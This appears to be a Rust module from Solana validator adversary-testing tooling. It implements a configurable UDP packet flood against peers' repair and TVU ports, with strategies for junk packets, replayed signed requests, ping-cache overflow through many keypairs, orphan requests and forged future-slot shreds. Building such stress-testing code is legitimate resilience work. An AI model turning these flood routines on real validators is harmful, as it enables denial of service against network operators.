use {
    crate::{
        adversary_feature_set::repair_packet_flood::{FloodConfig, FloodStrategy},
        flood_worker::{create_rayon_thread_pool, init_keypair_pool, AdversaryWorkersContext},
        PeerIdentifierSanitized,
    },
    log::*,
    rand::{thread_rng, Rng},
    rayon::{prelude::*, ThreadPool},
    solana_entry::entry::Entry,
    solana_gossip::{
        cluster_info::ClusterInfo,
        contact_info::{ContactInfo, Protocol},
    },
    solana_hash::Hash,
    solana_keypair::Keypair,
    solana_ledger::{
        leader_schedule_cache::LeaderScheduleCache,
        shred::{Nonce, ProcessShredsStats, ReedSolomonCache, Shredder},
    },
    solana_net_protocol::repair::{RepairProtocol, RepairRequestHeader},
    solana_runtime::bank_forks::BankForks,
    solana_signer::Signer,
    solana_streamer::sendmmsg::{batch_send, SendPktsError},
    solana_system_transaction as system_transaction,
    solana_time_utils::timestamp,
    std::{
        net::UdpSocket,
        sync::{
            atomic::{AtomicBool, Ordering},
            Arc, RwLock,
        },
        thread::{self, sleep, Builder},
        time::{Duration, Instant},
    },
};

pub struct RepairPacketFlood;

impl RepairPacketFlood {
    pub fn start(
        repair_socket: Arc<UdpSocket>,
        bank_forks: Arc<RwLock<BankForks>>,
        cluster_info: Arc<ClusterInfo>,
        leader_schedule_cache: Arc<LeaderScheduleCache>,
        configs: Vec<FloodConfig>,
    ) -> AdversaryWorkersContext {
        let exit = Arc::new(AtomicBool::default());
        let thread_pool = create_rayon_thread_pool("solAdvRPFWrkr");
        let keypair_pool = Arc::new(RwLock::new(Vec::default()));
        let mut i: usize = 0;
        let thread_hdls = configs
            .into_iter()
            .map(|config| {
                let exit = exit.clone();
                let thread_pool = thread_pool.clone();
                let repair_socket = repair_socket.clone();
                let bank_forks = bank_forks.clone();
                let cluster_info = cluster_info.clone();
                let leader_schedule_cache = leader_schedule_cache.clone();
                let thread_name = format!("solAdvRpFld{i:02}");
                let keypair_pool = keypair_pool.clone();
                i = i.saturating_add(1);
                Builder::new()
                    .name(thread_name.clone())
                    .spawn(move || {
                        Self::run(
                            &repair_socket,
                            &bank_forks,
                            &cluster_info,
                            &leader_schedule_cache,
                            &exit,
                            &thread_pool,
                            config,
                            thread_name,
                            &keypair_pool,
                        );
                    })
                    .unwrap()
            })
            .collect();
        AdversaryWorkersContext::new(exit, thread_hdls)
    }

    fn flood_minimal_packets(
        repair_socket: &UdpSocket,
        config: &FloodConfig,
        peers: &[ContactInfo],
    ) -> usize {
        let mut reqs_v = Vec::default();
        peers.iter().for_each(|peer| {
            for i in 0..config.packets_per_peer_per_iteration {
                let val: u8 = i.wrapping_rem(u8::MAX as u32).try_into().unwrap();
                reqs_v.push((vec![val], peer.serve_repair(Protocol::UDP).unwrap()));
            }
        });
        let mut packet_count = reqs_v.len();
        let reqs_iter = reqs_v.iter().map(|(data, addr)| (data, addr));
        if let Err(SendPktsError::IoError(err, num_failed)) = batch_send(repair_socket, reqs_iter) {
            packet_count = packet_count.saturating_sub(num_failed);
            error!(
                "batch_send failed to send {}/{} packets first error {:?}",
                num_failed,
                reqs_v.len(),
                err
            );
        }
        packet_count
    }

    fn flood_signed_packets(
        repair_socket: &UdpSocket,
        cluster_info: &ClusterInfo,
        config: &FloodConfig,
        peers: &[ContactInfo],
    ) -> usize {
        let identity_keypair = cluster_info.keypair().clone();
        let mut reqs_v = Vec::default();
        peers.iter().for_each(|peer| {
            let header = RepairRequestHeader::new(
                cluster_info.id(),
                *peer.pubkey(),
                timestamp(),
                789, /*nonce*/
            );
            let request_proto = RepairProtocol::HighestWindowIndex {
                header,
                slot: 123,
                shred_index: 0,
            };
            let packet_buf =
                RepairProtocol::repair_proto_to_bytes(&request_proto, &identity_keypair).unwrap();
            for _i in 0..config.packets_per_peer_per_iteration {
                reqs_v.push((
                    packet_buf.clone(),
                    peer.serve_repair(Protocol::UDP).unwrap(),
                ));
            }
        });
        let mut packet_count = reqs_v.len();
        let reqs_iter = reqs_v.iter().map(|(data, addr)| (data, addr));
        if let Err(SendPktsError::IoError(err, num_failed)) = batch_send(repair_socket, reqs_iter) {
            packet_count = packet_count.saturating_sub(num_failed);
            error!(
                "batch_send failed to send {}/{} packets first error {:?}",
                num_failed,
                reqs_v.len(),
                err
            );
        }
        packet_count
    }

    fn flood_ping_cache(
        repair_socket: &UdpSocket,
        bank_forks: &RwLock<BankForks>,
        config: &FloodConfig,
        peers: &[ContactInfo],
        thread_pool: &ThreadPool,
        keypair_pool: &RwLock<Vec<Keypair>>,
    ) -> usize {
        const MIN_PARALLEL_ITEMS: usize = 1_000;
        const MAX_SENDMMSG_ITEMS: usize = 10_000;

        // Populate keypair pool if necessary
        // See REPAIR_PING_CACHE_CAPACITY to size keypair_pool
        init_keypair_pool(
            keypair_pool,
            usize::try_from(config.packets_per_peer_per_iteration).unwrap(),
            thread_pool,
        );

        let slot = bank_forks.read().unwrap().working_bank().slot();
        let mut packet_count: usize = 0;
        let keypairs = keypair_pool.read().unwrap();
        peers.iter().for_each(|peer| {
            for chunk in keypairs.chunks(MAX_SENDMMSG_ITEMS) {
                let reqs_v: Vec<_> = thread_pool
                    .install(|| {
                        chunk
                            .par_iter()
                            .with_min_len(MIN_PARALLEL_ITEMS)
                            .map(|keypair| {
                                let header = RepairRequestHeader::new(
                                    keypair.pubkey(),
                                    *peer.pubkey(),
                                    timestamp(),
                                    789, /*nonce*/
                                );
                                let request_proto = RepairProtocol::HighestWindowIndex {
                                    header,
                                    slot,
                                    shred_index: 0,
                                };
                                let packet_buf =
                                    RepairProtocol::repair_proto_to_bytes(&request_proto, keypair)
                                        .unwrap();
                                (packet_buf, peer.serve_repair(Protocol::UDP).unwrap())
                            })
                    })
                    .collect();
                packet_count = packet_count.saturating_add(reqs_v.len());
                let reqs_iter = reqs_v.iter().map(|(data, addr)| (data, addr));
                if let Err(SendPktsError::IoError(err, num_failed)) =
                    batch_send(repair_socket, reqs_iter)
                {
                    packet_count = packet_count.saturating_sub(num_failed);
                    error!(
                        "batch_send failed to send {}/{} packets first error {:?}",
                        num_failed,
                        reqs_v.len(),
                        err
                    );
                }
            }
        });
        packet_count
    }

    fn flood_orphan_requests(
        repair_socket: &UdpSocket,
        cluster_info: &ClusterInfo,
        bank_forks: &RwLock<BankForks>,
        config: &FloodConfig,
        peers: &[ContactInfo],
    ) -> usize {
        let identity_keypair = cluster_info.keypair().clone();
        let slot = bank_forks.read().unwrap().highest_slot();
        let mut reqs_v = Vec::default();
        peers.iter().for_each(|peer| {
            let nonce = thread_rng().gen_range(0..Nonce::MAX);
            let header =
                RepairRequestHeader::new(cluster_info.id(), *peer.pubkey(), timestamp(), nonce);
            let request_proto = RepairProtocol::Orphan { header, slot };
            let packet_buf =
                RepairProtocol::repair_proto_to_bytes(&request_proto, &identity_keypair).unwrap();
            for _i in 0..config.packets_per_peer_per_iteration {
                reqs_v.push((
                    packet_buf.clone(),
                    peer.serve_repair(Protocol::UDP).unwrap(),
                ));
            }
        });
        let mut packet_count = reqs_v.len();
        let reqs_iter = reqs_v.iter().map(|(data, addr)| (data, addr));
        if let Err(SendPktsError::IoError(err, num_failed)) = batch_send(repair_socket, reqs_iter) {
            packet_count = packet_count.saturating_sub(num_failed);
            error!(
                "batch_send failed to send {}/{} packets first error {:?}",
                num_failed,
                reqs_v.len(),
                err
            );
        }
        packet_count
    }

    fn flood_fake_future_leader_slots(
        repair_socket: &UdpSocket,
        bank_forks: &RwLock<BankForks>,
        cluster_info: &ClusterInfo,
        leader_schedule_cache: &LeaderScheduleCache,
        config: &FloodConfig,
        peers: &[ContactInfo],
    ) -> usize {
        let my_keypair = cluster_info.keypair().clone();
        let my_id = cluster_info.id();
        let shred_version = cluster_info.my_shred_version();
        let bank = bank_forks.read().unwrap().working_bank();
        let current_slot = bank.slot();
        let entries: Vec<_> = (0..2)
            .map(|_| {
                let keypair0 = Keypair::new();
                let keypair1 = Keypair::new();
                let tx0 =
                    system_transaction::transfer(&keypair0, &keypair1.pubkey(), 1, Hash::default());
                Entry::new(&Hash::default(), 1, vec![tx0])
            })
            .collect();
        let mut shreds_v = Vec::default();
        leader_schedule_cache
            .leader_slot_iter(&my_id, current_slot, &bank)
            .take(config.packets_per_peer_per_iteration as usize)
            .for_each(|slot| {
                let shredder = Shredder::new(
                    slot,
                    slot.saturating_sub(1), /*parent_slot*/
                    0,                      /*reference_tick*/
                    shred_version,
                )
                .unwrap();
                let data_shreds: Vec<_> = shredder
                    .make_merkle_shreds_from_entries(
                        &my_keypair,
                        &entries,
                        false,
                        Hash::default(),
                        0,
                        0,
                        &ReedSolomonCache::default(),
                        &mut ProcessShredsStats::default(),
                    )
                    .collect();
                if let Some(shred) = data_shreds.first() {
                    shreds_v.push(shred.clone());
                }
            });
        let mut packet_count: usize = 0;
        peers.iter().for_each(|peer| {
            let packets: Vec<_> = shreds_v
                .iter()
                .map(|shred| (shred.payload(), peer.tvu(Protocol::UDP).unwrap()))
                .collect();
            let packets_len = packets.len();
            packet_count = packet_count.saturating_add(packets_len);
            if let Err(SendPktsError::IoError(err, num_failed)) = batch_send(repair_socket, packets)
            {
                packet_count = packet_count.saturating_sub(num_failed);
                error!(
                    "batch_send failed to send {num_failed}/{packets_len} packets first error \
                     {err:?}",
                );
            }
        });
        packet_count
    }

    fn run(
        repair_socket: &UdpSocket,
        bank_forks: &RwLock<BankForks>,
        cluster_info: &ClusterInfo,
        leader_schedule_cache: &LeaderScheduleCache,
        exit: &AtomicBool,
        thread_pool: &ThreadPool,
        config: FloodConfig,
        thread_name: String,
        keypair_pool: &RwLock<Vec<Keypair>>,
    ) {
        const REPORT_INTERVAL_MS: u64 = 2_000;
        let mut last_report = Instant::now();
        let mut iteration: u64 = 0;
        let mut packet_count: usize = 0;

        loop {
            if exit.load(Ordering::Relaxed) {
                return;
            }

            let peers = {
                let peers = cluster_info.repair_peers(u64::MAX);
                if let Some(peer_id) = config.target.as_ref() {
                    // pubkey verified by RPC
                    let peer_id = PeerIdentifierSanitized::try_from(peer_id).unwrap();
                    let matches_ci = |ci: &&ContactInfo| -> bool {
                        match peer_id {
                            PeerIdentifierSanitized::Pubkey(pubkey) => pubkey == *ci.pubkey(),
                            PeerIdentifierSanitized::Ip(ip) => {
                                ip == ci.serve_repair(Protocol::UDP).unwrap().ip()
                            }
                        }
                    };
                    peers
                        .iter()
                        .find(matches_ci)
                        .cloned()
                        .map(|ci| vec![ci])
                        .unwrap_or_else(|| {
                            error!("repair packet flood: target={peer_id:?} not found");
                            thread::sleep(Duration::from_secs(2));
                            Vec::default()
                        })
                } else {
                    peers
                }
            };

            packet_count = packet_count.saturating_add(match config.flood_strategy {
                FloodStrategy::MinimalPackets => {
                    Self::flood_minimal_packets(repair_socket, &config, &peers)
                }
                FloodStrategy::SignedPackets => {
                    Self::flood_signed_packets(repair_socket, cluster_info, &config, &peers)
                }
                FloodStrategy::PingCacheOverflow => Self::flood_ping_cache(
                    repair_socket,
                    bank_forks,
                    &config,
                    &peers,
                    thread_pool,
                    keypair_pool,
                ),
                FloodStrategy::Orphan => Self::flood_orphan_requests(
                    repair_socket,
                    cluster_info,
                    bank_forks,
                    &config,
                    &peers,
                ),
                FloodStrategy::FakeFutureLeaderSlots => Self::flood_fake_future_leader_slots(
                    repair_socket,
                    bank_forks,
                    cluster_info,
                    leader_schedule_cache,
                    &config,
                    &peers,
                ),
            });
            if last_report.elapsed() >= Duration::from_millis(REPORT_INTERVAL_MS) {
                let num_peers = peers.len();
                info!(
                    "repair_packet_flood {thread_name}: num_peers={num_peers} \
                     iteration={iteration}, packets={packet_count}"
                );
                packet_count = 0;
                last_report = Instant::now();
            }
            iteration = iteration.saturating_add(1);
            if config.iteration_delay_us > 0 {
                sleep(Duration::from_micros(config.iteration_delay_us));
            }
        }
    }
}
